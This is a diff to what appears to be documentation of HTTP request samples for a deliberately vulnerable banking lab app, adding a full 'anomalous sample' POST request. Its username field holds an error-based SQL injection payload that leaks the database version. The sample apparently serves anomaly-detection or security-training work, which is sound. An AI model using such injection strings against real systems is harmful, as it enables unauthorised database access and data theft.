@@ -49,4 +49,28 @@ Cookie: PHPSESSID=j1pavglp5ue30266c0j88ged30
 
 ### Anomalous sample
 
-POST /vulnbank/online/api.
+POST /vulnbank/online/api.php HTTP/1.1
+
+Host: 10.0.212.25
+
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0
+
+Accept: application/json, text/javascript, */*; q=0.01
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Referer: http://10.0.212.25/vulnbank/online/login.php
+
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+X-Requested-With: XMLHttpRequest
+
+Content-Length: 209
+
+Cookie: PHPSESSID=mlacs0uiou344i3fa53s7raut6
+
+Connection: keep-alive
+
+type=user&action=create&username=Jack'+and+extractvalue(0x0a,concat(0x0a,(select version())))+and+'1'='1&password=passw0rd&firstname=first&lastname=last&birthdate=30-08-2017&email=eee%40mail.com&phone=747474747&account=DE44404419569750553340&creditcard=4556-9373-3913-6510
